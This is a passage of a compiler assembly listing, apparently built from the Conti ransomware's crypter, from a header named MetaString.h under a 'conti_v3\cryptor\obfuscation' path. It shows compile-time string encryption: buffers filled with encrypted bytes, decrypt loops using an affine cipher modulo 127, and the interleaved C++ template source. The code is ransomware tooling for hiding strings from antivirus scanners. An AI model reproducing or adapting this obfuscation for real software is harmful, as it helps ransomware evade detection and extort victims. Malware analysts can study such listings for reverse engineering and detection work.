  000d3	c6 41 35 18	 mov	 BYTE PTR [rcx+53], 24
  000d7	c6 41 36 3a	 mov	 BYTE PTR [rcx+54], 58	; 0000003aH
  000db	c6 41 37 3e	 mov	 BYTE PTR [rcx+55], 62	; 0000003eH
  000df	c6 41 38 3a	 mov	 BYTE PTR [rcx+56], 58	; 0000003aH
  000e3	c6 41 39 17	 mov	 BYTE PTR [rcx+57], 23
  000e7	c6 41 3a 3a	 mov	 BYTE PTR [rcx+58], 58	; 0000003aH
  000eb	c6 41 3b 2c	 mov	 BYTE PTR [rcx+59], 44	; 0000002cH
  000ef	c6 41 3c 3a	 mov	 BYTE PTR [rcx+60], 58	; 0000003aH
  000f3	c6 41 3d 18	 mov	 BYTE PTR [rcx+61], 24
  000f7	c6 41 3e 3a	 mov	 BYTE PTR [rcx+62], 58	; 0000003aH
  000fb	c6 41 3f 4b	 mov	 BYTE PTR [rcx+63], 75	; 0000004bH
  000ff	c6 41 40 3a	 mov	 BYTE PTR [rcx+64], 58	; 0000003aH
  00103	c6 41 41 40	 mov	 BYTE PTR [rcx+65], 64	; 00000040H
  00107	c6 41 42 3a	 mov	 BYTE PTR [rcx+66], 58	; 0000003aH
  0010b	c6 41 43 40	 mov	 BYTE PTR [rcx+67], 64	; 00000040H
  0010f	c6 41 44 3a	 mov	 BYTE PTR [rcx+68], 58	; 0000003aH
  00113	c6 41 45 7c	 mov	 BYTE PTR [rcx+69], 124	; 0000007cH
  00117	c6 41 46 3a	 mov	 BYTE PTR [rcx+70], 58	; 0000003aH
  0011b	c6 41 47 40	 mov	 BYTE PTR [rcx+71], 64	; 00000040H
  0011f	c6 41 48 3a	 mov	 BYTE PTR [rcx+72], 58	; 0000003aH
  00123	c6 41 49 35	 mov	 BYTE PTR [rcx+73], 53	; 00000035H
  00127	c6 41 4a 3a	 mov	 BYTE PTR [rcx+74], 58	; 0000003aH
  0012b	c6 41 4b 6c	 mov	 BYTE PTR [rcx+75], 108	; 0000006cH
  0012f	c6 41 4c 3a	 mov	 BYTE PTR [rcx+76], 58	; 0000003aH
  00133	c6 41 4d 35	 mov	 BYTE PTR [rcx+77], 53	; 00000035H
  00137	c6 41 4e 3a	 mov	 BYTE PTR [rcx+78], 58	; 0000003aH
  0013b	c6 41 4f 50	 mov	 BYTE PTR [rcx+79], 80	; 00000050H
  0013f	c6 41 50 3a	 mov	 BYTE PTR [rcx+80], 58	; 0000003aH

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00143	c6 41 51 39	 mov	 BYTE PTR [rcx+81], 57	; 00000039H
  00147	c6 41 52 3a	 mov	 BYTE PTR [rcx+82], 58	; 0000003aH
  0014b	c6 41 53 04	 mov	 BYTE PTR [rcx+83], 4
  0014f	c6 41 54 3a	 mov	 BYTE PTR [rcx+84], 58	; 0000003aH
  00153	c6 41 55 3a	 mov	 BYTE PTR [rcx+85], 58	; 0000003aH
  00157	c6 41 56 3a	 mov	 BYTE PTR [rcx+86], 58	; 0000003aH
  0015b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]

; 52   :     {
; 53   : 
; 54   :     }

  0015f	48 8b c1	 mov	 rax, rcx
  00162	c3		 ret	 0
??0?$MetaBuffer@$0GL@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<107,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85> >::MetaBuffer<107,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GN@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GN@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<109,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 4e 00 00
	00		 mov	 r11d, 78		; 0000004eH
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 15	 sub	 ecx, 21

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 07	 imul	 r8d, ecx, 7

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GN@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<109,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GN@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GN@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<109,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::MetaBuffer<109,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 55	 mov	 BYTE PTR [rcx+1], 85	; 00000055H
  00007	c6 41 02 15	 mov	 BYTE PTR [rcx+2], 21
  0000b	c6 41 03 35	 mov	 BYTE PTR [rcx+3], 53	; 00000035H
  0000f	c6 41 04 15	 mov	 BYTE PTR [rcx+4], 21
  00013	c6 41 05 49	 mov	 BYTE PTR [rcx+5], 73	; 00000049H
  00017	c6 41 06 15	 mov	 BYTE PTR [rcx+6], 21
  0001b	c6 41 07 51	 mov	 BYTE PTR [rcx+7], 81	; 00000051H
  0001f	c6 41 08 15	 mov	 BYTE PTR [rcx+8], 21
  00023	c6 41 09 5c	 mov	 BYTE PTR [rcx+9], 92	; 0000005cH
  00027	c6 41 0a 15	 mov	 BYTE PTR [rcx+10], 21
  0002b	c6 41 0b 50	 mov	 BYTE PTR [rcx+11], 80	; 00000050H
  0002f	c6 41 0c 15	 mov	 BYTE PTR [rcx+12], 21
  00033	c6 41 0d 37	 mov	 BYTE PTR [rcx+13], 55	; 00000037H
  00037	c6 41 0e 15	 mov	 BYTE PTR [rcx+14], 21
  0003b	c6 41 0f 25	 mov	 BYTE PTR [rcx+15], 37	; 00000025H
  0003f	c6 41 10 15	 mov	 BYTE PTR [rcx+16], 21
  00043	c6 41 11 6c	 mov	 BYTE PTR [rcx+17], 108	; 0000006cH
  00047	c6 41 12 15	 mov	 BYTE PTR [rcx+18], 21
  0004b	c6 41 13 49	 mov	 BYTE PTR [rcx+19], 73	; 00000049H
  0004f	c6 41 14 15	 mov	 BYTE PTR [rcx+20], 21
  00053	c6 41 15 50	 mov	 BYTE PTR [rcx+21], 80	; 00000050H
  00057	c6 41 16 15	 mov	 BYTE PTR [rcx+22], 21
  0005b	c6 41 17 5a	 mov	 BYTE PTR [rcx+23], 90	; 0000005aH
  0005f	c6 41 18 15	 mov	 BYTE PTR [rcx+24], 21
  00063	c6 41 19 24	 mov	 BYTE PTR [rcx+25], 36	; 00000024H
  00067	c6 41 1a 15	 mov	 BYTE PTR [rcx+26], 21
  0006b	c6 41 1b 6d	 mov	 BYTE PTR [rcx+27], 109	; 0000006dH
  0006f	c6 41 1c 15	 mov	 BYTE PTR [rcx+28], 21
  00073	c6 41 1d 6c	 mov	 BYTE PTR [rcx+29], 108	; 0000006cH
  00077	c6 41 1e 15	 mov	 BYTE PTR [rcx+30], 21
  0007b	c6 41 1f 50	 mov	 BYTE PTR [rcx+31], 80	; 00000050H
  0007f	c6 41 20 15	 mov	 BYTE PTR [rcx+32], 21
  00083	c6 41 21 75	 mov	 BYTE PTR [rcx+33], 117	; 00000075H
  00087	c6 41 22 15	 mov	 BYTE PTR [rcx+34], 21
  0008b	c6 41 23 6e	 mov	 BYTE PTR [rcx+35], 110	; 0000006eH
  0008f	c6 41 24 15	 mov	 BYTE PTR [rcx+36], 21
  00093	c6 41 25 52	 mov	 BYTE PTR [rcx+37], 82	; 00000052H
  00097	c6 41 26 15	 mov	 BYTE PTR [rcx+38], 21
  0009b	c6 41 27 50	 mov	 BYTE PTR [rcx+39], 80	; 00000050H
  0009f	c6 41 28 15	 mov	 BYTE PTR [rcx+40], 21
  000a3	c6 41 29 0d	 mov	 BYTE PTR [rcx+41], 13
  000a7	c6 41 2a 15	 mov	 BYTE PTR [rcx+42], 21
  000ab	c6 41 2b 6c	 mov	 BYTE PTR [rcx+43], 108	; 0000006cH
  000af	c6 41 2c 15	 mov	 BYTE PTR [rcx+44], 21
  000b3	c6 41 2d 5c	 mov	 BYTE PTR [rcx+45], 92	; 0000005cH
  000b7	c6 41 2e 15	 mov	 BYTE PTR [rcx+46], 21
  000bb	c6 41 2f 32	 mov	 BYTE PTR [rcx+47], 50	; 00000032H
  000bf	c6 41 30 15	 mov	 BYTE PTR [rcx+48], 21
  000c3	c6 41 31 35	 mov	 BYTE PTR [rcx+49], 53	; 00000035H
  000c7	c6 41 32 15	 mov	 BYTE PTR [rcx+50], 21
  000cb	c6 41 33 6e	 mov	 BYTE PTR [rcx+51], 110	; 0000006eH
  000cf	c6 41 34 15	 mov	 BYTE PTR [rcx+52], 21
  000d3	c6 41 35 5c	 mov	 BYTE PTR [rcx+53], 92	; 0000005cH
  000d7	c6 41 36 15	 mov	 BYTE PTR [rcx+54], 21
  000db	c6 41 37 31	 mov	 BYTE PTR [rcx+55], 49	; 00000031H
  000df	c6 41 38 15	 mov	 BYTE PTR [rcx+56], 21
  000e3	c6 41 39 01	 mov	 BYTE PTR [rcx+57], 1
  000e7	c6 41 3a 15	 mov	 BYTE PTR [rcx+58], 21
  000eb	c6 41 3b 01	 mov	 BYTE PTR [rcx+59], 1
  000ef	c6 41 3c 15	 mov	 BYTE PTR [rcx+60], 21
  000f3	c6 41 3d 37	 mov	 BYTE PTR [rcx+61], 55	; 00000037H
  000f7	c6 41 3e 15	 mov	 BYTE PTR [rcx+62], 21
  000fb	c6 41 3f 01	 mov	 BYTE PTR [rcx+63], 1
  000ff	c6 41 40 15	 mov	 BYTE PTR [rcx+64], 21
  00103	c6 41 41 50	 mov	 BYTE PTR [rcx+65], 80	; 00000050H
  00107	c6 41 42 15	 mov	 BYTE PTR [rcx+66], 21
  0010b	c6 41 43 42	 mov	 BYTE PTR [rcx+67], 66	; 00000042H
  0010f	c6 41 44 15	 mov	 BYTE PTR [rcx+68], 21
  00113	c6 41 45 50	 mov	 BYTE PTR [rcx+69], 80	; 00000050H
  00117	c6 41 46 15	 mov	 BYTE PTR [rcx+70], 21
  0011b	c6 41 47 75	 mov	 BYTE PTR [rcx+71], 117	; 00000075H
  0011f	c6 41 48 15	 mov	 BYTE PTR [rcx+72], 21
  00123	c6 41 49 6d	 mov	 BYTE PTR [rcx+73], 109	; 0000006dH
  00127	c6 41 4a 15	 mov	 BYTE PTR [rcx+74], 21
  0012b	c6 41 4b 4a	 mov	 BYTE PTR [rcx+75], 74	; 0000004aH
  0012f	c6 41 4c 15	 mov	 BYTE PTR [rcx+76], 21
  00133	c6 41 4d 15	 mov	 BYTE PTR [rcx+77], 21
  00137	c6 41 4e 15	 mov	 BYTE PTR [rcx+78], 21
  0013b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0013f	48 8b c1	 mov	 rax, rcx

; 51   :         : m_buffer{ encrypt(data[Ints])... }
; 52   :     {
; 53   : 
; 54   :     }

  00142	c3		 ret	 0
??0?$MetaBuffer@$0GN@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<109,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::MetaBuffer<109,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EP@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<79,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 6e 00 00
	00		 mov	 r10d, 110		; 0000006eH
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 0c 00 00 00	 mov	 eax, 12
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2d	 imul	 ecx, eax, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<79,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
